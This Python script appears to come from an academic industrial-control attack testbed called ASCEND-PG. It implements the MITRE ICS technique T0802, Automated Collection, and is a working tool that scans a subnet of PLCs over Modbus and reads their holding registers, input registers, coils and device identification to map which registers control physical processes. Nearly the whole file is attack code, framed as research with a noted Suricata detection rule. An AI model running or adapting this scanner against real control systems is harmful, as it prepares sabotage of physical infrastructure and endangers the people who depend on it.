#!/usr/bin/env python3
"""
ASCEND-PG attacks/automated_collection.py

MITRE ATT&CK for ICS: T0802 — Automated Collection.

Systematically scans all PLCs on the network, reading holding registers,
input registers, coils, and device identification. This maps the entire
ICS environment — discovering which registers control which physical
processes.

Similar to Industroyer/CrashOverride which automatically collected
protocol object data from targeted ICS networks.

PPO Parameters Used:
  - target_ip: Starting PLC IP to scan from
  - register_address: Base register address to begin scanning
  - value_magnitude: Determines scan depth (1.0 = standard, >1.0 = aggressive)

Detection: Suricata detects high-volume Modbus reads (SID 9000027).

Run this ON THE ATTACKER HOST:
    python3 attacks/automated_collection.py --target 10.0.0.1

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import time
from datetime import datetime, timezone
from pathlib import Path

from pymodbus.client import ModbusTcpClient

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"
MODBUS_PORT = 502


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    events = []
    if log_path.exists():
        try:
            events = json.loads(log_path.read_text())
        except json.JSONDecodeError:
            events = []
    events.append(event)
    log_path.write_text(json.dumps(events, indent=2))


def scan_plc(ip: str, base_address: int, scan_depth: int,
             log_path: Path) -> dict:
    """Scan a single PLC for register values and device info."""
    result = {
        "ip": ip,
        "holding_registers": [],
        "input_registers": [],
        "coils": [],
        "device_info": None,
    }

    client = ModbusTcpClient(ip, port=MODBUS_PORT, timeout=3)

    try:
        if not client.connect():
            print(f"[auto_collection] Cannot connect to {ip}")
            return result

        # Read holding registers
        resp = client.read_holding_registers(base_address, scan_depth, unit=1)
        if not resp.isError():
            result["holding_registers"] = resp.registers
            print(f"[auto_collection] {ip} holding[{base_address}:{base_address+scan_depth}] = {resp.registers}")

        # Read input registers
        resp = client.read_input_registers(base_address, scan_depth, unit=1)
        if not resp.isError():
            result["input_registers"] = resp.registers
            print(f"[auto_collection] {ip} input[{base_address}:{base_address+scan_depth}] = {resp.registers}")

        # Read coils (first 10)
        resp = client.read_coils(0, 10, unit=1)
        if not resp.isError():
            result["coils"] = resp.bits[:10]
            print(f"[auto_collection] {ip} coils[0:10] = {resp.bits[:10]}")

        # Read device identification
        try:
            resp = client.read_device_information(device_id=1)
            if not resp.isError():
                result["device_info"] = resp.information
                print(f"[auto_collection] {ip} device_info = {resp.information}")
        except Exception:
            pass

    except Exception as exc:
        print(f"[auto_collection] Error scanning {ip}: {exc}")
    finally:
        client.close()

    return result


def run_automated_collection(subnet: str, base_address: int,
                             scan_depth: int, log_path: Path) -> dict:
    """Scan all PLCs in the subnet for register values."""
    # Build list of PLC IPs from subnet
    if subnet.endswith("/24"):
        base = subnet.rsplit(".", 1)[0]
        plc_ips = [f"{base}.{i}" for i in range(1, 15)]  # .1 to .14
    else:
        plc_ips = [subnet]

    print(f"[auto_collection] Scanning {len(plc_ips)} PLCs from {plc_ips[0]} to {plc_ips[-1]}")
    print(f"[auto_collection] Base address: {base_address}, scan depth: {scan_depth}")

    log_event(log_path, {
        "stage": "attack", "technique": "T0802",
        "action": "auto_collection_start",
        "subnet": subnet,
        "plc_count": len(plc_ips),
        "base_address": base_address,
        "scan_depth": scan_depth,
    })

    all_results = {}
    for ip in plc_ips:
        result = scan_plc(ip, base_address, scan_depth, log_path)
        all_results[ip] = result

        log_event(log_path, {
            "stage": "attack", "technique": "T0802",
            "action": "auto_collection_scan",
            "target": ip,
            "holding_count": len(result["holding_registers"]),
            "input_count": len(result["input_registers"]),
            "coil_count": len(result["coils"]),
            "has_device_info": result["device_info"] is not None,
        })

        time.sleep(0.1)  # Brief delay between PLCs

    # Summary
    total_registers = sum(
        len(r["holding_registers"]) + len(r["input_registers"])
        for r in all_results.values()
    )
    print(f"\n[auto_collection] Scan complete: {len(all_results)} PLCs, "
          f"{total_registers} registers collected")

    log_event(log_path, {
        "stage": "attack", "technique": "T0802",
        "action": "auto_collection_end",
        "plcs_scanned": len(all_results),
        "total_registers": total_registers,
    })

    return all_results


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Automated Collection (T0802) — systematic "
                    "scan of all PLC registers and device info"
    )
    parser.add_argument("--target", default="10.0.0.1",
                        help="Target PLC IP or subnet (default: 10.0.0.1)")
    parser.add_argument("--subnet", default="10.0.0.0/24",
                        help="Subnet to scan (default: 10.0.0.0/24)")
    parser.add_argument("-a", "--register-address", type=int, default=40000,
                        help="Base register address to start scanning (default: 40000)")
    parser.add_argument("-v", "--value-magnitude", type=float, default=1.0,
                        help="Scan depth multiplier: 1.0=50, 1.5=75, 2.0=100 (default: 1.0)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    # Calculate scan depth based on value_magnitude
    scan_depth = int(50 * args.value_magnitude)

    run_automated_collection(
        args.subnet, args.register_address,
        scan_depth, log_path
    )

    print(f"\n[auto_collection] Done")


if __name__ == "__main__":
    main()
